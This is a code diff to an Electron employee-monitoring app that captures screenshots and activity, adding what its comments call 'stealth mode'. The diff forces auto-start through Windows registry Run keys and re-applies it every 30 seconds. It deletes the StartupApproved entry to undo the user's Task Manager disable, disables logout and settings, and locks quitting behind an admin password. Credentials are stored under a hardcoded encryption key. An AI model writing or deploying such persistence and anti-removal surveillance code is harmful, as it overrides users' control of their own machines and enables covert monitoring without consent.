@@ -12,6 +12,22 @@ try {
   // dotenv not available in packaged app, use defaults
 }
 
+// Persistent credential storage with encryption
+const Store = require('electron-store');
+const store = new Store({
+  encryptionKey: 'employee-monitor-v1',
+  schema: {
+    credentials: {
+      type: 'object',
+      properties: {
+        token: { type: 'string' },
+        userId: { type: 'string' },
+        userData: { type: 'object' }
+      }
+    }
+  }
+});
+
 // Default production API URL - embedded for standalone operation
 const DEFAULT_API_URL = 'https://admin-dashboard-vert-iota-16.vercel.app';
 
@@ -58,6 +74,7 @@ async function apiCallWithRetry(apiCall, maxRetries = CONFIG.MAX_RETRIES) {
 
 let mainWindow;
 let tray = null;
+let adminQuitWindow = null;
 let screenshotInterval;
 let activityInterval;
 let heartbeatInterval;
@@ -186,10 +203,9 @@ function createTray() {
     },
     { type: 'separator' },
     {
-      label: 'Quit',
-      click: async () => {
-        await stopScreenshotCapture();
-        app.quit();
+      label: 'Quit (Admin Only)',
+      click: () => {
+        showAdminQuitDialog();
       }
     }
   ]);
@@ -225,10 +241,9 @@ function updateTrayMenu() {
     },
     { type: 'separator' },
     {
-      label: 'Quit',
-      click: async () => {
-        await stopScreenshotCapture();
-        app.quit();
+      label: 'Quit (Admin Only)',
+      click: () => {
+        showAdminQuitDialog();
       }
     }
   ]);
@@ -245,18 +260,71 @@ function showNotification(title, body) {
 }
 
 // Initialize app
-app.on('ready', () => {
+app.on('ready', async () => {
   console.log('Starting Employee Monitor...');
   console.log('API URL:', CONFIG.API_URL);
 
   createWindow();
 
-  // Setup auto-launch (optional - can be enabled by user)
+  // Setup auto-launch - always enabled for stealth mode
   setupAutoLaunch();
 
   // Setup sleep/wake handlers to prevent uptime inflation
   setupPowerMonitorHandlers();
+
+  // Check for stored credentials and auto-login
+  await checkStoredCredentials();
 });
+
+// Check stored credentials and auto-login if valid
+async function checkStoredCredentials() {
+  const credentials = store.get('credentials');
+
+  if (!credentials || !credentials.token) {
+    console.log('No stored credentials found, showing login');
+    return;
+  }
+
+  console.log('Found stored credentials, validating token...');
+
+  try {
+    // Validate token with server
+    const response = await axios.get(`${CONFIG.API_URL}/api/auth/verify`, {
+      headers: { Authorization: `Bearer ${credentials.token}` },
+      timeout: 10000
+    });
+
+    if (response.data.success) {
+      console.log('Token valid, auto-logging in...');
+
+      // Restore credentials to CONFIG
+      CONFIG.USER_TOKEN = credentials.token;
+      CONFIG.USER_ID = credentials.userId;
+      CONFIG.USER_DATA = credentials.userData;
+
+      // Fetch team settings
+      await fetchTeamSettings();
+
+      // Create tray icon
+      createTray();
+
+      // Start monitoring
+      startScreenshotCapture();
+
+      // Navigate to tracking page
+      if (mainWindow) {
+        mainWindow.loadFile(path.join(__dirname, 'tracking.html'));
+      }
+    } else {
+      console.log('Token invalid, clearing credentials');
+      store.delete('credentials');
+    }
+  } catch (error) {
+    console.log('Token validation failed:', error.message);
+    // Clear invalid credentials
+    store.delete('credentials');
+  }
+}
 
 // =====================================================
 // Power Monitor Handlers (Sleep/Wake Detection)
@@ -387,30 +455,83 @@ app.on('window-all-closed', () => {
   }
 });
 
+// Cleanup on quit
+app.on('before-quit', () => {
+  if (autoLaunchCheckInterval) {
+    clearInterval(autoLaunchCheckInterval);
+    autoLaunchCheckInterval = null;
+  }
+});
+
 app.on('activate', () => {
   if (mainWindow === null) {
     createWindow();
   }
 });
 
-// Setup auto-launch on system boot
+// Setup auto-launch on system boot - always enabled in stealth mode
+// Auto-launch enforcement - checks and re-enables if user disabled it
+let autoLaunchCheckInterval = null;
+
 async function setupAutoLaunch() {
+  // Only run on Windows for now (registry-based approach)
+  if (process.platform !== 'win32') {
+    console.log('Auto-launch enforcement only supported on Windows');
+    return;
+  }
+
+  // Force enable auto-launch on startup
+  await enforceAutoLaunch();
+
+  // Periodically check and re-enable if user disabled it (every 30 seconds)
+  autoLaunchCheckInterval = setInterval(enforceAutoLaunch, 30 * 1000);
+}
+
+async function enforceAutoLaunch() {
+  if (process.platform !== 'win32') return;
+
+  const exePath = app.getPath('exe');
+  const appName = 'EmployeeMonitor';
+
+  console.log('Enforcing auto-launch for:', exePath);
+
   try {
-    const AutoLaunch = require('auto-launch');
-    const autoLauncher = new AutoLaunch({
-      name: 'Employee Monitor',
-      path: app.getPath('exe'),
-      isHidden: true
+    // Use reg.exe directly - more reliable than PowerShell for registry operations
+    // Add the Run key (standard auto-start)
+    // Note: Path needs escaped quotes because it may contain spaces
+    await new Promise((resolve) => {
+      const regCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${appName}" /t REG_SZ /d "\\"${exePath}\\"" /f`;
+      console.log('Running:', regCommand);
+      exec(regCommand,
+        { timeout: 10000 },
+        (error, stdout, stderr) => {
+          if (error) {
+            console.log('Failed to add Run key:', error.message, stderr);
+          } else {
+            console.log('Run key added successfully');
+          }
+          resolve();
+        }
+      );
     });
 
-    // Check if enabled and enable if not
-    const isEnabled = await autoLauncher.isEnabled();
-    if (!isEnabled) {
-      // Auto-launch is disabled by default, user can enable in settings
-      console.log('Auto-launch is available but not enabled');
-    }
+    // Remove the StartupApproved entry (clears Task Manager's "disabled" flag)
+    await new Promise((resolve) => {
+      exec(`reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" /v "${appName}" /f`,
+        { timeout: 10000 },
+        (error, stdout, stderr) => {
+          // Error is expected if key doesn't exist - that's fine
+          if (!error) {
+            console.log('StartupApproved entry removed (was disabled, now enabled)');
+          }
+          resolve();
+        }
+      );
+    });
+
+    console.log('Auto-launch enforcement complete');
   } catch (error) {
-    console.log('Auto-launch not available:', error.message);
+    console.log('Error enforcing auto-launch:', error.message);
   }
 }
 
@@ -424,7 +545,17 @@ ipcMain.on('login', async (event, credentials) => {
       CONFIG.USER_ID = response.data.userId;
       CONFIG.USER_DATA = response.data.user;
 
+      // Store credentials for persistent login
+      store.set('credentials', {
+        token: response.data.token,
+        userId: response.data.userId,
+        userData: response.data.user
+      });
+
       event.reply('login-response', { success: true, user: response.data.user });
+
+      // Enforce auto-launch after successful login
+      enforceAutoLaunch();
 
       // Fetch team settings
       await fetchTeamSettings();
@@ -446,36 +577,8 @@ ipcMain.on('login', async (event, credentials) => {
 });
 
 ipcMain.on('logout', async (event) => {
-  try {
-    // Stop tracking and flush all pending data
-    await stopScreenshotCapture();
-
-    // Clear user data
-    CONFIG.USER_TOKEN = null;
-    CONFIG.USER_ID = null;
-    CONFIG.USER_DATA = null;
-    teamSettings = null;
-
-    // Destroy tray
-    if (tray) {
-      tray.destroy();
-      tray = null;
-    }
-
-    // Return to login screen
-    if (mainWindow) {
-      mainWindow.loadFile(path.join(__dirname, 'login.html'));
-    }
-  } catch (error) {
-    console.error('Error during logout:', error);
-    // Still clear everything even if there was an error
-    CONFIG.USER_TOKEN = null;
-    CONFIG.USER_ID = null;
-    CONFIG.USER_DATA = null;
-    if (mainWindow) {
-      mainWindow.loadFile(path.join(__dirname, 'login.html'));
-    }
-  }
+  // Logout is disabled in stealth mode - employees cannot logout
+  console.log('Logout attempted but disabled in stealth mode');
 });
 
 ipcMain.on('get-tracking-status', (event) => {
@@ -509,11 +612,10 @@ ipcMain.on('change-password', async (event, { currentPassword, newPassword }) =>
   }
 });
 
-// Open settings page
+// Open settings page - disabled in stealth mode
 ipcMain.on('open-settings', (event) => {
-  if (mainWindow) {
-    mainWindow.loadFile(path.join(__dirname, 'settings.html'));
-  }
+  // Settings access is disabled in stealth mode
+  console.log('Settings access attempted but disabled in stealth mode');
 });
 
 // Navigate to different pages
@@ -532,6 +634,104 @@ ipcMain.on('navigate-to', (event, page) => {
       break;
     default:
       console.log('Unknown page:', page);
+  }
+});
+
+// =====================================================
+// Admin Quit Dialog (Stealth Mode)
+// =====================================================
+
+function showAdminQuitDialog() {
+  // Don't open multiple dialogs
+  if (adminQuitWindow) {
+    adminQuitWindow.focus();
+    return;
+  }
+
+  const iconPath = getIconPath('icon.png');
+
+  adminQuitWindow = new BrowserWindow({
+    width: 450,
+    height: 480,
+    parent: mainWindow,
+    modal: true,
+    show: false,
+    resizable: false,
+    minimizable: false,
+    maximizable: false,
+    backgroundColor: '#667eea',
+    webPreferences: {
+      nodeIntegration: false,
+      contextIsolation: true,
+      preload: path.join(__dirname, 'preload.js')
+    },
+    ...(iconPath && { icon: iconPath })
+  });
+
+  adminQuitWindow.loadFile(path.join(__dirname, 'admin-password.html'));
+
+  adminQuitWindow.once('ready-to-show', () => {
+    adminQuitWindow.show();
+  });
+
+  adminQuitWindow.on('closed', () => {
+    adminQuitWindow = null;
+  });
+}
+
+// Admin quit authentication handler
+ipcMain.on('admin-quit-auth', async (event, { email, password }) => {
+  try {
+    // Validate credentials against server
+    const response = await axios.post(`${CONFIG.API_URL}/api/auth/login`, {
+      email,
+      password
+    }, { timeout: 10000 });
+
+    if (response.data.success) {
+      // Check if user has admin role
+      const user = response.data.user;
+      if (user.role === 'admin') {
+        console.log('Admin authenticated, quitting application...');
+        event.reply('admin-quit-response', { success: true });
+
+        // Clear stored credentials
+        store.delete('credentials');
+
+        // Stop tracking and quit
+        await stopScreenshotCapture();
+
+        // Close the dialog first
+        if (adminQuitWindow) {
+          adminQuitWindow.close();
+        }
+
+        // Quit the app
+        app.quit();
+      } else {
+        event.reply('admin-quit-response', {
+          success: false,
+          message: 'Only administrators can quit this application'
+        });
+      }
+    } else {
+      event.reply('admin-quit-response', {
+        success: false,
+        message: response.data.message || 'Authentication failed'
+      });
+    }
+  } catch (error) {
+    event.reply('admin-quit-response', {
+      success: false,
+      message: error.response?.data?.message || 'Authentication failed'
+    });
+  }
+});
+
+// Admin quit cancel handler
+ipcMain.on('admin-quit-cancel', () => {
+  if (adminQuitWindow) {
+    adminQuitWindow.close();
   }
 });
 
